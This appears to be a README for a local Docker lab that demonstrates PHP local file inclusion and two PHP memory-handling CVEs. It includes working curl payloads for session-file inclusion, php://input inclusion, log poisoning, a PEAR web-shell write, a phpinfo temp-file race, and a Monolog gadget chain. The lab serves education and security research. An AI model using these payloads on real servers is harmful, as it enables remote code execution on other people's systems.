# PHP Upload Progress & LFI Lab

A local Docker lab for learning about PHP session upload progress, local file inclusion (LFI), and the issues tracked as **CVE-2026-109618** and **CVE-2026-109619**.

> **Intended use:** Education and authorized security research only. Do not use this project for unauthorized access, disruption, or other malicious activity. Test only on systems you own or have explicit permission to assess.
>
> **Validation status:** The `cve-lab/` environment demonstrates both CVEs. CVE-2026-109618: OOM-handling difference between pre-fix (8.4.4, `longjmp` bailout) and post-fix (8.4.27, delayed OOM). CVE-2026-109619: rfc1867 upload-progress callback calls `__wakeup` on preloaded classes in pre-fix PHP but not in post-fix. Verified on both amd64 (WSL) and arm64 (macOS). The `lab/` LFI examples use an intentionally vulnerable application and do not reproduce either CVE.

## Scope

- An intentionally vulnerable PHP application for session-file and stream-wrapper inclusion demonstrations (`lab/`).
- Five Docker lab variants for comparing runtimes and configuration (`lab/`).
- An experimental network observer for the ASAN lab (`observer.py`). It does not inspect PHP worker memory or validate a CVE trigger.
- A CVE reproduction environment (`cve-lab/`) that demonstrates the OOM bailout state corruption (CVE-2026-109618) and FPM worker stale state (CVE-2026-109619) by comparing PHP 8.4.4 (pre-fix) with PHP 8.4.27 (post-fix).

## Upstream advisories

| CVE | Issue | Validation in this repository |
| --- | --- | --- |
| [CVE-2026-109618](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w) | Invalid request memory after an out-of-memory interruption. | OOM bailout behavior difference demonstrated (longjmp vs delayed-OOM). |
| [CVE-2026-109619](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp) | Stale worker state referring to freed request memory. | rfc1867 `__wakeup` call demonstrated: pre-fix calls `__wakeup` on preloaded classes during upload-progress callback; post-fix blocks it via `incomplete_classes_only`. |

The first PHP releases containing both fixes are **8.2.35, 8.3.36, 8.4.27, and 8.5.12**. Consult the [PHP security announcement](https://www.php.net/archive/2026.php#2026-10-21-5) and your distribution vendor for affected deployments and backported fixes. The affected deployment scope includes FPM and mod_php.

## Environments

All published HTTP ports bind to `127.0.0.1`. Paths below are relative to `lab/`.

| Compose file | PHP runtime | Host port | Configuration |
| --- | --- | --- | --- |
| `docker-compose.yml` | 8.4.4 / FPM + nginx | 8080 | Baseline lab. |
| `docker-compose.mitigated.yml` | 8.4.4 / FPM + nginx | 8080 | Upload-progress tracking disabled. |
| `docker-compose.patched.yml` | 8.4.27 / FPM + nginx | 8080 | PHP release containing the upstream fixes. |
| `docker-compose.modphp.yml` | 8.4.4 / Apache mod_php | 8082 | Alternative SAPI. |
| `docker-compose.asan.yml` | 8.4.4 / source-built FPM + nginx | 8083 | Experimental ASAN build. |

The baseline, mitigated, and patched variants share a service name, container name, and port. Stop the active variant before switching. Image availability and successful builds are not guaranteed by version pins alone.

All variants retain the application's deliberate LFI. The baseline configuration also sets `session.upload_progress.cleanup=Off` and `allow_url_include=On`, unlike PHP's documented defaults. The mitigated variant leaves URL inclusion enabled. See the [session](https://www.php.net/manual/en/session.configuration.php) and [filesystem](https://www.php.net/manual/en/filesystem.configuration.php) configuration references.

## CVE reproduction lab

The `cve-lab/` directory is a separate Docker environment for studying the OOM-handling mechanism that the upstream fix replaced. It builds PHP from source with debug symbols.

### Environments

All ports bind to `127.0.0.1`. Paths below are relative to `cve-lab/`.

| Compose file | PHP version | Host port | Purpose |
| --- | --- | --- | --- |
| `docker-compose.yml` | 8.4.4 | 8084 | Pre-fix: OOM uses longjmp bailout. |
| `docker-compose.patched.yml` | 8.4.27 | 8086 | Post-fix: OOM uses delayed-OOM state machine. |
| `docker-compose.asan-zmm.yml` | 8.4.4 + ASAN | 8087 | ASAN-instrumented pre-fix build with Zend MM enabled. |

All variants use `pm.max_children = 1` so every request hits the same FPM worker, which is necessary to observe stale worker state across requests.

### Quick start

```bash
docker compose -f cve-lab/docker-compose.yml up --build -d
docker compose -f cve-lab/docker-compose.patched.yml up --build -d
curl -s http://127.0.0.1:8084/debug.php   # pre-fix  — should show PHP 8.4.4
curl -s http://127.0.0.1:8086/debug.php   # post-fix — should show PHP 8.4.27
```

### Observing the bailout difference

`cve_compare.php` triggers an OOM inside a function and checks whether execution continues after the allocation call:

```bash
# Pre-fix — longjmp skips remaining code:
curl -s http://127.0.0.1:8084/cve_compare.php | grep -E 'MARKER|NEVER'
# (no output — both lines were skipped by the bailout)

# Post-fix — delayed OOM lets the function return:
curl -s http://127.0.0.1:8086/cve_compare.php | grep -E 'MARKER|NEVER'
# MARKER_AFTER_OOM
# NEVER_REACHED
```

Pre-fix PHP never executes the code after `str_repeat` because `longjmp` unwinds the call stack immediately. Post-fix PHP sets `delayed_oom.state = PENDING`, lets `str_repeat` return normally, and fires a VM interrupt at the next opcode to handle the error cleanly. The pre-fix bailout is what leaves internal engine structures (hash tables, object store) in an inconsistent state (CVE-2026-109618).

### Verified output comparison

```
=== 8.4.4 (pre-fix): longjmp bailout ===
BEFORE_OOM
SHUTDOWN: entered              ← MARKER_AFTER_OOM skipped
SHUTDOWN: allocated 10 objects

=== 8.4.27 (post-fix): delayed OOM ===
BEFORE_OOM
MARKER_AFTER_OOM               ← function returned normally
NEVER_REACHED
SHUTDOWN: entered
SHUTDOWN: allocated 10 objects
```

### ASAN instrumentation notes

The ASAN-instrumented build (`docker-compose.asan-zmm.yml`) runs with `USE_ZEND_ALLOC=1` (Zend Memory Manager enabled). Because the Zend MM manages its own allocation pools via `mmap`, ASAN cannot observe individual object-level use-after-free within the Zend heap. Setting `USE_ZEND_ALLOC=0` makes all allocations visible to ASAN but disables `memory_limit` enforcement, preventing the OOM trigger. This is a structural limitation of combining ASAN with Zend MM — the upstream project uses its own test infrastructure (`--ASAN--` sections in `.phpt` files) rather than standalone ASAN for these specific memory-corruption scenarios.

### FPM worker survival (CVE-2026-109619)

After an OOM, the FPM worker continues serving new requests. With `pm.max_children = 1`, every request reuses the same worker:

```bash
# Trigger OOM, then check the worker PID
curl -s http://127.0.0.1:8084/cve109618.php > /dev/null
curl -s http://127.0.0.1:8084/debug.php | grep PID
# PID: 9  (same worker that experienced the OOM bailout)
```

On pre-fix PHP, the surviving worker may retain stale pointers from the interrupted request. On post-fix PHP, the delayed-OOM mechanism ensures all per-request state is cleaned up before the worker accepts a new connection.

### rfc1867 `__wakeup` during upload-progress (CVE-2026-109619)

The rfc1867 upload-progress callback unserializes session data before the request script runs. On pre-fix PHP, this performs full unserialization including `__wakeup` calls on preloaded classes, which can modify worker-global state with request-scoped pointers that become stale after the request ends.

This requires `opcache.preload` to register classes before the rfc1867 callback runs — `auto_prepend_file` is too late (it runs after SAPI input filtering).

```bash
# Step 1: store a WakeupLogger object in the session
curl -s 'http://127.0.0.1:8084/cve109619_setup.php?sid=test619'

# Step 2: upload a file to trigger rfc1867 callback
curl -s -F 'PHP_SESSION_UPLOAD_PROGRESS=trigger' \
     -F 'file=@somefile.bin' \
     -b 'PHPSESSID=test619' \
     http://127.0.0.1:8084/index.php > /dev/null

# Step 3: check if __wakeup was called
curl -s http://127.0.0.1:8084/cve109619_read_log.php
```

### Verified `__wakeup` comparison

```
=== 8.4.4 (pre-fix) ===
wakeup.log:
[03:31:31] PID=10 __wakeup called, id=planted_10, data_len=350
[03:31:31] PID=10 __wakeup called, id=planted_10, data_len=350

=== 8.4.27 (post-fix) ===
wakeup.log: empty (no __wakeup calls detected)
```

Pre-fix PHP calls `__wakeup` during the rfc1867 callback (twice — once per session read during the upload). Post-fix PHP uses `incomplete_classes_only` mode, preventing `__wakeup` execution entirely. This is the mechanism that CVE-2026-109619 exploits: a preloaded class whose `__wakeup` stores `$this` in a static variable leaves a dangling pointer after request memory is freed.

### CLI reproduction

`cve109618_cli.php` can be run directly via the PHP CLI inside the container for closer inspection:

```bash
docker exec cve-oom-lab php -d memory_limit=33M -d zend.enable_gc=0 \
    /var/www/html/cve109618_cli.php
```

### Shutdown

```bash
docker compose -f cve-lab/docker-compose.yml down
docker compose -f cve-lab/docker-compose.patched.yml down
docker compose -f cve-lab/docker-compose.asan-zmm.yml down
```

## LFI lab (application-level demonstrations, not CVE reproduction)

The `lab/` directory contains a **separate** environment for studying general LFI techniques. These are application-level vulnerabilities (deliberate `include()` on user input) unrelated to the memory-corruption CVEs above.

### Quick start

Requirements: Docker with Docker Compose and `curl`. The optional observer also needs Python 3, `venv`, and `pip`. Run commands from the **repository root**.

```bash
docker compose -f lab/docker-compose.yml up --build -d
docker compose -f lab/docker-compose.yml ps
curl --fail --silent --show-error http://127.0.0.1:8080/index.php
curl --fail --silent --show-error http://127.0.0.1:8080/debug.php
```

Wait for the baseline container to become `healthy`. `index.php` returns an empty HTTP 200 response when the application is reachable. `debug.php` returns the PHP version, SAPI, and selected INI values; the baseline should report PHP 8.4.4 and `fpm-fcgi`. PHP can display disabled boolean INI values as an empty string.

To switch to the upload-progress configuration comparison:

```bash
docker compose -f lab/docker-compose.yml down
docker compose -f lab/docker-compose.mitigated.yml up --build -d
curl --fail --silent --show-error http://127.0.0.1:8080/debug.php
```

To switch from that variant to the patched-version recipe:

```bash
docker compose -f lab/docker-compose.mitigated.yml down
docker compose -f lab/docker-compose.patched.yml up --build -d
curl --fail --silent --show-error http://127.0.0.1:8080/debug.php
```

The mitigated and patched variants have no Compose healthcheck. Confirm their HTTP endpoints respond after switching.

## LFI demonstrations

All examples below depend on the deliberate `include()` vulnerability in `view.php`. None of them reproduces either CVE; they demonstrate application-level file inclusion under deliberately permissive lab settings.

### Included in the baseline lab

These work against the **baseline** environment on port 8080 with no extra setup. Stop other variants first if running.

**Session-file inclusion** — inject PHP into the session upload-progress data, then include the session file:

```bash
curl -s http://127.0.0.1:8080/upload.php \
  -F 'PHP_SESSION_UPLOAD_PROGRESS=<?php system("id"); ?>' \
  -F 'file=@/dev/null;filename=test.txt' \
  -b 'PHPSESSID=testsid001'
curl -s 'http://127.0.0.1:8080/view.php?file=/var/lib/php/sessions/sess_testsid001'
```

**Stream-wrapper inclusion** — `php://input` passes the request body directly to `include()`. Independent of upload-progress tracking:

```bash
curl -s 'http://127.0.0.1:8080/view.php?file=php://input' \
  -d '<?php system("id"); ?>'
```

**Log poisoning** — inject PHP into the Nginx access log via `User-Agent`, then include the log file. Clear the log first to avoid parse errors from earlier entries:

```bash
docker exec php2shell-lab truncate -s 0 /var/log/nginx/access.log
curl -s -A '<?php echo `id`; ?>' http://127.0.0.1:8080/ > /dev/null
curl -s 'http://127.0.0.1:8080/view.php?file=/var/log/nginx/access.log'
```

Backticks are used instead of `system()` because Nginx escapes double quotes in the log (`\x22`), which breaks PHP string literals. Backtick execution (`\`cmd\``) avoids this.

### Requiring additional setup inside the container

These techniques need packages or endpoints not included in the lab image. Install them in the running container.

**PEAR command-injection** — `pearcmd.php` interprets query-string arguments as CLI options when `register_argc_argv` is enabled. `config-create` writes a PHP-parseable configuration file to the web root:

```bash
docker exec php2shell-lab sh -c "\
  apt-get update -qq && apt-get install -y -qq php-pear > /dev/null 2>&1 && \
  echo 'register_argc_argv = On' >> /usr/local/etc/php/php.ini && \
  kill -USR2 1 && \
  chmod 777 /var/www/html"
sleep 2
curl -s "http://127.0.0.1:8080/view.php?file=/usr/local/lib/php/pearcmd.php&+config-create+/<?=system(chr(105).chr(100));?>+/var/www/html/pear_shell.php"
curl -s http://127.0.0.1:8080/pear_shell.php | head -3
docker exec php2shell-lab rm -f /var/www/html/pear_shell.php
```

**phpinfo temporary-file race** — `phpinfo()` discloses the upload temporary path while the request is still being served. A slow-flushing endpoint keeps the temp file alive long enough for a concurrent LFI request to include it:

```bash
docker exec php2shell-lab sh -c "cat > /var/www/html/phpinfo_slow.php << 'EOF'
<?php
for (\$i = 0; \$i < 100; \$i++) { echo str_repeat('A', 4096); flush(); }
phpinfo();
for (\$i = 0; \$i < 200; \$i++) { echo str_repeat('B', 4096); flush(); usleep(1000); }
EOF"
```

Then race in two terminals — upload a PHP payload to the slow phpinfo endpoint and include the disclosed temp path before the request finishes:

```bash
# Terminal 1: stream phpinfo output and extract the temp path
curl -s -F "file=@<(echo '<?php system(\"id\"); ?>')" \
  http://127.0.0.1:8080/phpinfo_slow.php | grep -oP '/tmp/php\w+'

# Terminal 2: include the path from terminal 1 before it disappears
curl -s 'http://127.0.0.1:8080/view.php?file=/tmp/phpXXXXXX'
```

This is a timing-dependent race. Automating it with concurrent threads is more reliable than manual attempts.

**Monolog deserialization gadget** — with Monolog 2.x installed and an `unserialize()` sink, the `BufferHandler` → `StreamHandler` POP chain writes arbitrary content to a file on `__destruct`:

```bash
docker exec php2shell-lab sh -c "\
  apt-get update -qq && apt-get install -y -qq unzip > /dev/null 2>&1 && \
  cd /var/www/html && \
  COMPOSER_ALLOW_SUPERUSER=1 composer require monolog/monolog:^2.0 --no-interaction --quiet"
```

This requires a PHP endpoint that calls `unserialize()` on user input — not included in the lab, since the attack vector is the application's deserialization sink rather than file inclusion. A gadget payload serialized from `BufferHandler(StreamHandler("/var/www/html/shell.php"))` writes a PHP file to the web root when the object is destroyed.

An `id` result in any of the above demonstrates command execution inside the container, not a PHP memory-corruption vulnerability.

## Experimental observer

`observer.py` targets `127.0.0.1:8083`. It sends up to **2,600 workload requests** across three phases with 8, 4, and 4 client threads, plus an initial reachability check. A failed initial check stops the run before the workload starts.

```bash
python3 -m venv .venv
.venv/bin/python -m pip install -r requirements.txt
docker compose -f lab/docker-compose.asan.yml up --build -d
docker compose -f lab/docker-compose.asan.yml ps
curl --fail --silent --show-error http://127.0.0.1:8083/index.php
.venv/bin/python observer.py
```

The observer is **silent when no errors are recorded**. It reports communication failures, HTTP 4xx/5xx responses, and other errors to stderr, then exits with status 1. A silent exit with status 0 is not a CVE verdict. The script starts its workload when executed or imported; it is not an import-safe helper.

If worker threads do not finish, an error is reported and later phases are skipped. The active threads are not cancelled and can continue making requests. Join timeouts apply separately to each thread and do not impose a hard limit on the whole run.

Client concurrency does not prove same-worker reuse or stale-pointer access. Fresh session IDs do not establish that session garbage collection ran. A memory-corruption claim requires an attributable memory diagnostic and stack trace.

Inspect the lab's diagnostics separately:

```bash
docker compose -f lab/docker-compose.asan.yml logs --no-color
docker exec php2shell-asan sh -c 'cat /var/log/asan/report.* 2>/dev/null'
```

## Shutdown and host effects

Use the Compose file that started the active variant:

```bash
docker compose -f lab/docker-compose.yml down
docker compose -f lab/docker-compose.mitigated.yml down
docker compose -f lab/docker-compose.patched.yml down
docker compose -f lab/docker-compose.modphp.yml down
docker compose -f lab/docker-compose.asan.yml down
```

Only the command for the running variant is needed. Preserve required container logs and ASAN reports before removing containers.

- Every variant mounts `lab/www/` **read-write**. Container writes to the web root persist on the host. Review `git diff -- lab/www` and `git status --short --untracked-files=all -- lab/www` after testing.
- The mod_php variant adds `SYS_PTRACE` and disables the AppArmor profile where supported, reducing its isolation.
- Loopback binding still allows access from local software. Builds use the network to fetch dependencies. Use a disposable test environment and keep these recipes out of production.
- The baseline, mitigated, patched, and mod_php variants use `restart: unless-stopped`. Shut them down when finished.

## Repository layout

```text
.
├── README.md
├── LICENSE
├── SECURITY.md
├── requirements.txt
├── observer.py
├── lab/                           # LFI demonstrations
│   ├── Dockerfile*
│   ├── docker-compose*.yml
│   ├── entrypoint.sh
│   ├── nginx.conf
│   ├── php.ini
│   ├── php-mitigated.ini
│   ├── www.conf
│   └── www/
│       ├── index.php
│       ├── debug.php
│       ├── upload.php
│       ├── session.php
│       └── view.php
└── cve-lab/                       # CVE reproduction
    ├── Dockerfile
    ├── docker-compose.yml         # pre-fix (8.4.4)
    ├── docker-compose.patched.yml # post-fix (8.4.27)
    ├── docker-compose.asan-zmm.yml
    ├── entrypoint.sh
    ├── nginx.conf
    ├── php.ini
    ├── www.conf
    ├── test_compare.sh
    ├── test_cve109618.sh
    ├── test_cve109619.sh
    └── www/
        ├── cve_compare.php        # bailout behavior comparison
        ├── cve109618.php          # OOM trigger (str_repeat)
        ├── cve109618_aggressive.php # deep circular refs + destructors
        ├── cve109618_cli.php      # OOM trigger for CLI/gdb
        ├── cve109618_followup.php # post-OOM worker state probe
        ├── cve109619_preload.php   # __wakeup logger (opcache.preload)
        ├── cve109619_read_log.php # read wakeup detection log
        ├── cve109619_setup.php    # store WakeupLogger in session
        ├── debug.php
        └── index.php
```

## Use and maintenance

This is a personal learning project. Pull requests and code contributions are not accepted. See [SECURITY.md](SECURITY.md) for security concerns.

Use the material for education and authorized testing. Do not use it to compromise other systems or cause harm. This intended-use notice does not add restrictions to the MIT License.

## License

[MIT](LICENSE). The license defines reuse permissions, conditions, and the warranty disclaimer. PHP, container images, and dependencies retain their own licenses.
